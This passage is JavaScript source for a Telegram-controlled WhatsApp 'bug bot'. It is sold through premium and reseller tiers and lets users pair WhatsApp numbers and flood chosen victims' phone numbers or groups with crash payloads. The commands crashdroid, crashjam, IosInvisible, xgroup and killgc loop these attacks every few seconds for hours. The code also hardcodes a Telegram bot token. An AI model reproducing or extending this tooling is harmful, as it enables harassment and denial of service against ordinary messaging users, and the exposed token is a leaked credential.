            if (!isOwner && !isReseller) return S7.sendMessage(chatId, notauthorized);

            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /delprem ID');

            if (!db.premium.includes(targetId)) return S7.sendMessage(chatId, 'User is not Premium.');

            db.premium = db.premium.filter(id => id !== targetId);
            saveDB(db);
            S7.sendMessage(chatId, `🗑️ ID ${targetId} removed from Premium.`);
        });

        SYLoVe('crashfinity', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const targetNum = args[1];

            const s7CM = args[0].replace('/', '/').replace('.', ''); 

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
            if (!waSessions[chatId] || waSessions[chatId].length === 0) {
                return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
            }

            if (!targetNum) {
                return S7.sendMessage(chatId, `❌ Provide a phone number.\nExample: ${s7CM} +919876543210`);
            }

            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;
            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client = randomSession.sock;
            const senderNum = randomSession.num;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) {
                    return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
                }

                log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);

                if (typeof CrashLogic.crashfinity === 'function') {
                    await CrashLogic.crashfinity(client, targetJid);
                } else {
                    throw new Error(`Function not found in ${s7CM}.js`);
                }

                const SYLoves = BvgSYLoVe(cleanTarget);                                
                await S7.sendPhoto(chatId, botConfig.logo, { 
                    caption: SYLoves,
                    parse_mode: 'HTML'
                });

            } catch (err) {
                log('error', `${s7CM}`, err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe(['xgroup', 'groupui'], async (msg) => {
            try {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');

                const s7CM = args[0].replace('/', '/').replace('.', ''); 
                const targetNum = args[1];
                const durationArg = args[2];

                if (!LoveGlobalState(userId)) {
                    return sendSYLove(S7, chatId);
                }

                if (!waSessions[chatId] || waSessions[chatId].length === 0) {
                    return S7.sendMessage(
                        chatId,
                        `❌ No Number connected please use /reqpair to connect.`
                    );
                }

                if (!targetNum || !durationArg) {
                    return S7.sendMessage(
                        chatId,
                        `❌ Provide a GC jid and Duration.\nExample: ${s7CM} 1236xxx@g.us 1`
                    );
                }

                if (!targetNum.endsWith('@g.us')) {
                    return S7.sendMessage(chatId, '❌ Invalid group JID');
                }

                if (isNaN(durationArg)) {
                    return S7.sendMessage(chatId, '❌ Duration must be a number (Hours)');
                }

                const targetJid = targetNum.trim();
                const hours = parseInt(durationArg);
                if (!hours || hours <= 0) {
                    return S7.sendMessage(chatId, '❌ Invalid time value');
                }

                const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
                const client = randomSession.sock;
                const senderNum = randomSession.num;

                log(
                    'command',
                    msg.from.first_name,
                    `Calling ${s7CM} on ${targetJid} for ${hours} hours via ${senderNum}`
                );

                const SYLoves = BvgSYLoVe(targetJid);

                await S7.sendPhoto(chatId, botConfig.logo, {
                    caption: SYLoves,
                    parse_mode: 'HTML'
                });

                const delayMs = 2000;
                const endTime = Date.now() + hours * 60 * 60 * 1000;

                const interval = setInterval(async () => {
                    if (Date.now() >= endTime) {
                        clearInterval(interval);
                        return;
                    }

                    try {
                        if (typeof XgcLogic.Xgc === 'function') {
                            await XgcLogic.Xgc(client, targetJid);
                        }
                    } catch (err) {
                        console.log(`[xgroup background] error: ${err.message}`);
                    }
                }, delayMs);

            } catch (err) {
                log('error', 'xgroup', err.message);
                await S7.sendMessage(
                    msg.chat.id,
                    `❌ Error: ${err.message}`
                );
            }
        });

        SYLoVe(['trashsysgp'], async (msg) => {
            try {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');

                const s7CM = args[0].replace('/', '/').replace('.', ''); 
                const targetNum = args[1];
                const durationArg = args[2];

                if (!LoveGlobalState(userId)) {
                    return sendSYLove(S7, chatId);
                }

                if (!waSessions[chatId] || waSessions[chatId].length === 0) {
                    return S7.sendMessage(
                        chatId,
                        `❌ No Number connected please use /reqpair to connect.`
                    );
                }

                if (!targetNum || !durationArg) {
                    return S7.sendMessage(
                        chatId,
                        `❌ Provide a GC jid and Duration.\nExample: ${s7CM} 1236xxx@g.us 1`
                    );
                }

                if (!targetNum.endsWith('@g.us')) {
                    return S7.sendMessage(chatId, '❌ Invalid group JID');
                }

                if (isNaN(durationArg)) {
                    return S7.sendMessage(chatId, '❌ Duration must be a number (Hours)');
                }

                const targetJid = targetNum.trim();
                const hours = parseInt(durationArg);
                if (!hours || hours <= 0) {
                    return S7.sendMessage(chatId, '❌ Invalid time value');
                }

                const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
                const client = randomSession.sock;
                const senderNum = randomSession.num;

                log(
                    'command',
                    msg.from.first_name,
                    `Calling ${s7CM} on ${targetJid} for ${hours} hours via ${senderNum}`
                );

                const SYLoves = BvgSYLoVe(targetJid);

                await S7.sendPhoto(chatId, botConfig.logo, {
                    caption: SYLoves,
                    parse_mode: 'HTML'
                });

                const delayMs = 2000;
                const endTime = Date.now() + hours * 60 * 60 * 1000;

                const interval = setInterval(async () => {
                    if (Date.now() >= endTime) {
                        clearInterval(interval);
                        return;
                    }

                    try {
                        if (typeof killsystemLogic.killsystem === 'function') {
                            await killsystemLogic.killsystem(client, targetJid);
                            await gcFrzLogic.gcFrz(client, targetJid);
                        }
                    } catch (err) {
                        console.log(`[killsystemgc background] error: ${err.message}`);
                    }
                }, delayMs);

            } catch (err) {
                log('error', 'killsystemgc', err.message);
                await S7.sendMessage(
                    msg.chat.id,
                    `❌ Error: ${err.message}`
                );
            }
        });

        SYLoVe(['killgc', 'groupfriz'], async (msg) => {
            try {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');

                const s7CM = args[0].replace('/', '/').replace('.', ''); 
                const targetNum = args[1];
                const durationArg = args[2];

                if (!LoveGlobalState(userId)) {
                    return sendSYLove(S7, chatId);
                }

                if (!waSessions[chatId] || waSessions[chatId].length === 0) {
                    return S7.sendMessage(
                        chatId,
                        `❌ No Number connected please use /reqpair to connect.`
                    );
                }

                if (!targetNum || !durationArg) {
                    return S7.sendMessage(
                        chatId,
                        `❌ Provide a GC jid and Duration.\nExample: ${s7CM} 1236xxx@g.us 1`
                    );
                }

                if (!targetNum.endsWith('@g.us')) {
                    return S7.sendMessage(chatId, '❌ Invalid group JID');
                }

                if (isNaN(durationArg)) {
                    return S7.sendMessage(chatId, '❌ Duration must be a number (Hours)');
                }

                const targetJid = targetNum.trim();
                const hours = parseInt(durationArg);
                if (!hours || hours <= 0) {
                    return S7.sendMessage(chatId, '❌ Invalid time value');
                }

                const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
                const client = randomSession.sock;
                const senderNum = randomSession.num;

                log(
                    'command',
                    msg.from.first_name,
                    `Calling ${s7CM} on ${targetJid} for ${hours} hours via ${senderNum}`
                );

                const SYLoves = BvgSYLoVe(targetJid);

                await S7.sendPhoto(chatId, botConfig.logo, {
                    caption: SYLoves,
                    parse_mode: 'HTML'
                });

                const delayMs = 2000;
                const endTime = Date.now() + hours * 60 * 60 * 1000;

                const interval = setInterval(async () => {
                    if (Date.now() >= endTime) {
                        clearInterval(interval);
                        return;
                    }

                    try {
                        if (typeof gcFrzLogic.gcFrz === 'function') {
                            await gcFrzLogic.gcFrz(client, targetJid);
                        }
                    } catch (err) {
                        console.log(`[xgroup background] error: ${err.message}`);
                    }
                }, delayMs);

            } catch (err) {
                log('error', s7CM, err.message);
                await S7.sendMessage(
                    msg.chat.id,
                    `❌ Error: ${err.message}`
                );
            }
        });

        SYLoVe(['crashdroid', 'killsystem'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');

            const s7CM = args[0].replace('/', '/').replace('.', ''); 

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

            if (!waSessions[chatId] || waSessions[chatId].length === 0) {
                return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
            }

            if (args.length < 3) {
                return S7.sendMessage(
                    chatId,
                    `❌ Provide a phone number.\nExample: /${s7CM} +919876543210 1`
                );
            }

            const cleanTarget = args[1].replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;

            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client = randomSession.sock;
            const senderNum = randomSession.num;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) {
                    return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
                }

                log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);

                const SYLoves = BvgSYLoVe(cleanTarget);
                await S7.sendPhoto(chatId, botConfig.logo, {
                    caption: SYLoves,
                    parse_mode: 'HTML'
                });

                const delayMs = 2000;

                if (args[2] === 'only') {
                    const count = parseInt(args[3]);
                    if (!count || count <= 0) {
                        return S7.sendMessage(chatId, '❌ Invalid count value');
                    }

                    let sent = 0;
                    const interval = setInterval(async () => {
                        if (sent >= count) {
                            clearInterval(interval);
                            return;
                        }

                        try {
                            await killsystemLogic.killsystem(client, targetJid);
                            sent++;
                        } catch (err) {
                            console.log(`[killsystem only] error: ${err.message}`);
                        }
                    }, delayMs);

                } else {
                    const hours = parseInt(args[2]);
                    if (!hours || hours <= 0) {
                        return S7.sendMessage(chatId, '❌ Invalid time value');
                    }

                    const endTime = Date.now() + hours * 60 * 60 * 1000;
                    const interval = setInterval(async () => {
                        if (Date.now() >= endTime) {
                            clearInterval(interval);
                            return;
                        }

                        try {
                            await killsystemLogic.killsystem(client, targetJid);
                        } catch (err) {
                            console.log(`[killsystem time] error: ${err.message}`);
                        }
                    }, delayMs);
                }

            } catch (err) {
                log('error', s7CM, err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe(['crashjam', 'trashsystem'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');

            const s7CM = args[0].replace('/', '/').replace('.', ''); 

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

            if (!waSessions[chatId] || waSessions[chatId].length === 0) {
                return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
            }

            if (args.length < 3) {
                return S7.sendMessage(
                    chatId,
                    `❌ Provide a phone number.\nExample: /${s7CM} +919876543210 1`
                );
            }

            const cleanTarget = args[1].replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;

            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client = randomSession.sock;
            const senderNum = randomSession.num;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) {
                    return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
                }

                log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);

                const SYLoves = BvgSYLoVe(cleanTarget);
                await S7.sendPhoto(chatId, botConfig.logo, {
                    caption: SYLoves,
                    parse_mode: 'HTML'
                });

                const delayMs = 2000;

                if (args[2] === 'only') {
                    const count = parseInt(args[3]);
                    if (!count || count <= 0) {
                        return S7.sendMessage(chatId, '❌ Invalid count value');
                    }

                    let sent = 0;
                    const interval = setInterval(async () => {
                        if (sent >= count) {
                            clearInterval(interval);
                            return;
                        }

                        try {
                            await crashjamLogic.crashjam(client, targetJid);
                            sent++;
                        } catch (err) {
                            console.log(`[crashjam only] error: ${err.message}`);
                        }
                    }, delayMs);

                } else {
                    const hours = parseInt(args[2]);
                    if (!hours || hours <= 0) {
                        return S7.sendMessage(chatId, '❌ Invalid time value');
                    }

                    const endTime = Date.now() + hours * 60 * 60 * 1000;
                    const interval = setInterval(async () => {
                        if (Date.now() >= endTime) {
                            clearInterval(interval);
                            return;
                        }

                        try {
                            await crashjamLogic.crashjam(client, targetJid);
                        } catch (err) {
                            console.log(`[crashjam time] error: ${err.message}`);
                        }
                    }, delayMs);
                }

            } catch (err) {
                log('error', s7CM, err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe('test', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');

            const s7CM = args[0].replace('/', '/').replace('.', ''); 

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

            if (!waSessions[chatId] || waSessions[chatId].length === 0) {
                return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
            }

            if (args.length < 3) {
                return S7.sendMessage(
                    chatId,
                    `❌ Provide a phone number.\nExample: /${s7CM} +919876543210 1`
                );
            }

            const cleanTarget = args[1].replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;

            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client = randomSession.sock;
            const senderNum = randomSession.num;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) {
                    return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
                }

                log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);

                const SYLoves = BvgSYLoVe(cleanTarget);
                await S7.sendPhoto(chatId, botConfig.logo, {
                    caption: SYLoves,
                    parse_mode: 'HTML'
                });

                if (args[2] === 'only') {
                    const count = parseInt(args[3]);
                    if (!count || count <= 0) {
                        return S7.sendMessage(chatId, '❌ Invalid count value');
                    }

                    for (let i = 0; i < count; i++) {
                        await testlogic.test(client, targetJid);
                        await testlogic.test(client, targetJid);
                        await testlogic.test(client, targetJid);
                        await testlogic.test(client, targetJid);
                    }
                } else {
                    const hours = parseInt(args[2]);
                    if (!hours || hours <= 0) {
                        return S7.sendMessage(chatId, '❌ Invalid time value');
                    }

                    const endTime = Date.now() + hours * 60 * 60 * 1000;
                    while (Date.now() < endTime) {
                        await testlogic.test(client, targetJid);
                        await testlogic.test(client, targetJid);
                        await testlogic.test(client, targetJid);
                        await testlogic.test(client, targetJid);
                    }
                }

            } catch (err) {
                log('error', s7CM, err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe(['IosInvisible', 'hidenseek'], async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');

            const s7CM = args[0].replace('/', '/').replace('.', ''); 

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

            if (!waSessions[chatId] || waSessions[chatId].length === 0) {
                return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
            }

            if (args.length < 3) {
                return S7.sendMessage(
                    chatId,
                    `❌ Provide a phone number.\nExample: ${s7CM} +919876543210 1`
                );
            }

            const cleanTarget = args[1].replace(/[^0-9]/g, '');
            const targetJid = `${cleanTarget}@s.whatsapp.net`;

            const randomSession = waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
            const client = randomSession.sock;
            const senderNum = randomSession.num;

            try {
                const [exists] = await client.onWhatsApp(targetJid);
                if (!exists) {
                    return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
                }

                log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget} via ${senderNum}`);

                const SYLoves = BvgSYLoVe(cleanTarget);
                await S7.sendPhoto(chatId, botConfig.logo, {
                    caption: SYLoves,
                    parse_mode: 'HTML'
                });

                const delayMs = 500;

                if (args[2] === 'only') {
                    const count = parseInt(args[3]);
                    if (!count || count <= 0) {
                        return S7.sendMessage(chatId, '❌ Invalid count value');
                    }

                    let sent = 0;
                    const interval = setInterval(async () => {
                        if (sent >= count) {
                            clearInterval(interval);
                            return;
                        }

                        try {
                            await IosLogic.IosInvisible(client, targetJid);
                            sent++;
                        } catch (err) {
                            console.log(`[IosInvisible only] error: ${err.message}`);
                        }
                    }, delayMs);

                } else {
                    const hours = parseInt(args[2]);
                    if (!hours || hours <= 0) {
                        return S7.sendMessage(chatId, '❌ Invalid time value');
                    }

                    const endTime = Date.now() + hours * 60 * 60 * 1000;
                    const interval = setInterval(async () => {
                        if (Date.now() >= endTime) {
                            clearInterval(interval);
                            return;
                        }

                        try {
                            await IosLogic.IosInvisible(client, targetJid);
                        } catch (err) {
                            console.log(`[IosInvisible time] error: ${err.message}`);
                        }
                    }, delayMs);
                }

            } catch (err) {
                log('error', s7CM, err.message);
                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
            }
        });

        SYLoVe('broadcast', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();

            if (chatId !== config.adminId.toString()) {
                return S7.sendMessage(chatId, notauthorized, { parse_mode: 'HTML' });
            }

            const SY_BE_MY_LOVE_YOUR_SABIR7718 = msg.text.split(' ').slice(1).join(' ');
            if (!SY_BE_MY_LOVE_YOUR_SABIR7718) {
                return S7.sendMessage(chatId, '❌ *Usage:* /broadcast <your message>', { parse_mode: 'Markdown' });
            }

            const userFile = path.join(LoveDir, 'user.json');
            if (!fs.existsSync(userFile)) {
                return S7.sendMessage(chatId, '❌ No user database found.');
            }

            const UOFC5BCG_THATS_MEAN_SY = JSON.parse(fs.readFileSync(userFile));
            let SY_CALL_ME_YOUR_S7 = 0;
            let failed = 0;

            const statusMsg = await S7.sendMessage(chatId, `🚀 <b>Starting Broadcast...</b>\nTargeting: ${UOFC5BCG_THATS_MEAN_SY.length} users.`, { parse_mode: 'HTML' });

            for (const user of UOFC5BCG_THATS_MEAN_SY) {
                try {
                    await S7.sendMessage(user.id, `${SY_BE_MY_LOVE_YOUR_SABIR7718}`, { parse_mode: 'HTML' });
                    SY_CALL_ME_YOUR_S7++;
                    await new Promise(resolve => setTimeout(resolve, 100)); 
                } catch (err) {
                    failed++;
                }
            }

            S7.editMessageText(
                `✅ <b>Broadcast Finished</b>\n\n` +
                `👤 <b>Total Users:</b> ${UOFC5BCG_THATS_MEAN_SY.length}\n` +
                `✔️ <b>Successful:</b> ${SY_CALL_ME_YOUR_S7}\n` +
                `❌ <b>Failed:</b> ${failed}`,
                { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'HTML' }
            );
        });

        SYLoVe('listprem', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }
            if (chatId !== config.adminId) {
                return S7.sendMessage(chatId, notauthorized);
            }

            let db = getDB();
            if (db.premium.length === 0) {
                return S7.sendMessage(chatId, 'No premium users found.');
            }

            let SY_BE_MY_LOVE_YOUR_SABIR7718 = 'Premium List:\n\n';

            for (let i = 0; i < db.resellers.length; i++) {
                const id = db.resellers[i].toString();
                try {
                    const user = await S7.getChat(id);
                    const username = user.username ? `@${user.username} : ` : '';
                    SY_BE_MY_LOVE_YOUR_SABIR7718 += `${i + 1}. ${username}<code>${id}</code>\n`;
                } catch (e) {
                    SY_BE_MY_LOVE_YOUR_SABIR7718 += `${i + 1}. \`${id}\`\n`;
                }
            }
            SY_BE_MY_LOVE_YOUR_SABIR7718 += '\n──────────────────';

            S7.sendMessage(chatId, SY_BE_MY_LOVE_YOUR_SABIR7718, {
                parse_mode: 'HTML'
            });
        });

        SYLoVe('listgc', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();

            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (!waSessions[chatId] || waSessions[chatId].length === 0) {
                return S7.sendMessage(chatId, '❌ You have no connected WhatsApp numbers.\nUse /reqpair to connect one first.');
            }

            let output = `⬣ <b>YOUR CONNECTED WHATSAPP GROUPS</b>\n\n`;
            let totalGroups = 0;
            let index = 1;

            for (const session of waSessions[chatId]) {
                const sock = session.sock;
                const num = session.num;

                try {
                    const groupsObj = await sock.groupFetchAllParticipating();
                    const groups = Object.values(groupsObj);

                    if (groups.length === 0) continue;

                    output += `📱 <b>Number:</b> <code>${num}</code>\n`;
                    output += `━━━━━━━━━━━━━━━\n`;

                    for (const group of groups) {
                        const meta = await sock.groupMetadata(group.id);

                        output += `❏ Group ${index++}\n`;
                        output += `│⭔ <b>Name:</b> ${meta.subject || 'Unnamed'}\n`;
                        output += `│⭔ <b>ID:</b> <code>${meta.id}</code>\n`;
                        output += `│⭔ <b>Members:</b> ${meta.participants?.length || 0}\n`;
                        output += `╰──────────────\n\n`;

                        totalGroups++;
                    }
                } catch (err) {
                    log('error', 'LISTGC', `Failed for ${num} (user ${chatId}): ${err.message}`);
                    output += `⚠️ Failed to fetch groups for number ${num}: ${err.message}\n\n`;
                }
            }

            if (totalGroups === 0) {
                return S7.sendMessage(chatId, '❌ No groups found on your connected numbers.');
            }

            output = 
                `⬣ <b>YOUR WHATSAPP GROUPS (${totalGroups} total)</b>\n\n` +
                `📦 <b>Your connected numbers:</b> ${waSessions[chatId].length}\n\n` +
                output;

            if (output.length > 4000) {
                const filePath = `./Love/listgc_${chatId}.txt`;
                fs.writeFileSync(filePath, output.replace(/<[^>]*>/g, ''));
                return S7.sendDocument(chatId, filePath, {
                    caption: `📋 Full list of your WhatsApp groups (${totalGroups} groups)`
                });
            }

            S7.sendMessage(chatId, output, { parse_mode: 'HTML' });
        });

        SYLoVe('state', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const value = args[1];
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (chatId !== config.adminId) {
                return S7.sendMessage(chatId, notauthorized);
            }

            if (value !== '0' && value !== '1') {
                return S7.sendMessage(chatId, 'Usage: /state 0 | 1');
            }

            let db = getDB();
            db.state = Number(value);
            saveDB(db);

            S7.sendMessage(
                chatId,
                value === '0'
                    ? '✅ State set to FREE MODE (All users allowed)'
                    : '🔒 State set to PREMIUM ONLY MODE'
            );
        });

        SYLoVe('groupid', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();

            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            const args = msg.text.split(' ').slice(1);
            if (args.length === 0) {
                return S7.sendMessage(chatId, 'Usage: /groupid <group link>\nExample: /groupid https://chat.whatsapp.com/ABC123XYZ');
            }

            const inviteLink = args[0].trim();
            if (!inviteLink.includes('chat.whatsapp.com/')) {
                return S7.sendMessage(chatId, 'Invalid WhatsApp group link.');
            }

            const inviteCode = inviteLink.split('chat.whatsapp.com/')[1]?.trim();
            if (!inviteCode) {
                return S7.sendMessage(chatId, 'Link format wrong.');
            }

            try {
                const result = await client.groupAcceptInvite(inviteCode);
                if (!result?.gid) {
                    return S7.sendMessage(chatId, 'Failed. Link may be invalid or expired.');
                }

                const groupJid = result.gid;
                const meta = await client.groupMetadata(groupJid);

                let SABIR7718_LOVE_SY = `Group Info:\n\n`;
                SABIR7718_LOVE_SY += `Name: ${meta.subject || 'No Name'}\n`;
                SABIR7718_LOVE_SY += `JID: ${groupJid}\n`;
                SABIR7718_LOVE_SY += `Members: ${meta.participants?.length || '?'}\n`;
                SABIR7718_LOVE_SY += `Created: ${meta.creation ? new Date(meta.creation * 1000).toLocaleDateString() : '?'}`;

                const UOFC5BUCG = {
                    reply_markup: {
                        inline_keyboard: [
                            [
                                {
                                    text: '📋 Copy JID',
                                    callback_data: `copy_jid_${groupJid}`
                                }
                            ]
                        ]
                    }
                };

                await S7.sendMessage(chatId, SABIR7718_LOVE_SY, UOFC5BUCG);

            } catch (err) {
                console.log('groupid error:', err.message);
                await S7.sendMessage(chatId, 'Error fetching group. Link might be invalid/expired.');
            }
        });

        SYLoVe('listuser', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }
            if (msg.chat.id.toString() !== config.adminId) {
                return S7.sendMessage(msg.chat.id, notauthorized);
            }

            const userFile = path.join(LoveDir, 'user.json');
            if (!fs.existsSync(userFile)) return S7.sendMessage(msg.chat.id, 'No users found.');

            const users = JSON.parse(fs.readFileSync(userFile));
            let list = 'User List:\n\n';
            users.forEach((u, i) => {
                list += `${i + 1}. ${u.name} (${u.id})\n`;
            });

            if (list.length > 4000) {
                const listPath = path.join(LoveDir, 'list.txt');
                fs.writeFileSync(listPath, list);
                S7.sendDocument(msg.chat.id, listPath);
            } else {
                S7.sendMessage(msg.chat.id, list);
            }
        });

        S7.on('callback_query', async (query) => {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            const data = query.data;
            const userId = query.from.id;
            const name = query.from.username ? `@${query.from.username}` : query.from.first_name;
            const uptime = getRuntime();
            const love = userId.toString();
            const S7edit = (text, opts) => {
                S7.editMessageCaption(text, opts).catch((err) => {
                    if (!err.message.includes('message is not modified')) {
                        log('error', 'SYSTEM', err.message);
                    }
                });
            };

            if (data === 'check_membership') {
                const isMember = await CheckSYlovesToo(S7, userId, botConfig.channelId, botConfig.groupId, botOwnerId);

                if (isMember) {
                    S7.deleteMessage(chatId, messageId).catch(() => {});
                    S7.sendMessage(chatId, 
                        `✅ <b>Membership verified!</b>\nYou are now a member of both the channel and group. Try your command again (e.g., /start or /reqpair).`, 
                        { parse_mode: 'HTML' }
                    );
                } else {
                    S7.answerCallbackQuery(query.id, { 
                        text: '❌ You have not joined both the Channel and Group yet!', 
                        show_alert: true 
                    });
                }
            };

            if (data === 'misc_menu') {
                const chatId = query.message.chat.id;
                const userId = query.from.id.toString();
                if (!LoveGlobalState(userId)) {
                    return sendSYLove(S7, chatId);
                }
                const love = query.from.id.toString();
                const miscText = MainSYLoVe(name, uptime, love, botConfig.botName, botConfig.ownerContact) + `
┌──────┤ Misc Menu ├──────┐
│➻ reqpair number
│➻ delpair number
│➻ addprem ID
│➻ delprem ID
│➻ addresell ID
│➻ delresell ID
│➻ addtoken token
│➻ deltoken token
│➻ listprem
│➻ listresell
│➻ listuser
│➻ mytoken 
│➻ state 0 | 1
└──────────────────────┘
┌──────┤ Make Your Bot ├──────┐
│➻ /addbot  – Create a new bot
│➻ /delbot  – Delete an existing bot
│➻ /setbot  – Customize / configure your bot
└────────────────────────┘
                `;
                S7edit(miscText, { chat_id: chatId, message_id: messageId, ...SABIR7718 });
            }

            if (data === 'bug_menu') {
                const chatId = query.message.chat.id;
                const userId = query.from.id.toString();
                if (!LoveGlobalState(userId)) {
                    return sendSYLove(S7, chatId);
                }
                const love = query.from.id.toString();
                const bugText = MainSYLoVe(name, uptime, love, botConfig.botName, botConfig.ownerContact) + `
┌──────┤ Bug Android ├──────┐
│➻ crashjam num time
│➻ trashsystem num time
│➻ crashdroid num time
│➻ killsystem num time
│➻ forceblock num|amount
└──────────────────────┘
┌──────┤ Bug iOS ├──────┐
│➻ hidenseek number time
│➻ iosinvisible number time
└──────────────────────┘
┌──────┤ Bug Group ├──────┐
│➻ trashsysgp groupid time
│➻ xgroup groupid time
│➻ killgc groupid time
│➻ groupfriz groupid time
│➻ groupui groupid time
│➻ listgc
│➻ groupid link
└──────────────────────┘
                `;
                S7edit(bugText, { chat_id: chatId, message_id: messageId, ...SABIR7718 });
            }

            if (data.startsWith('copy_jid_')) {
                const jid = data.replace('copy_jid_', '');
                await S7.answerCallbackQuery(query.id, {
                    text: 'JID copied to clipboard!',
                    show_alert: false
                });
            }
        });

    } catch (err) {
        log('error', 'STARTUP', `Could not start bot with token: ${token.substring(0, 10)}...`);
    }
}

// Iniciar o Bot Principal com o Token Fornecido
startSYloveBot("8590832673:AAF9YcCnbb2OcPZ11iCZ3bQ_scN-2O0q324");

// Iniciar Bots Extras a partir da Base de Dados
const db = getDB();
if (db.tokens && db.tokens.length > 0) {
    db.tokens.forEach(obj => {
        startSYloveBot(obj.token);
    });
} else {
    log('info', null, 'No extra bots found in database.');
}
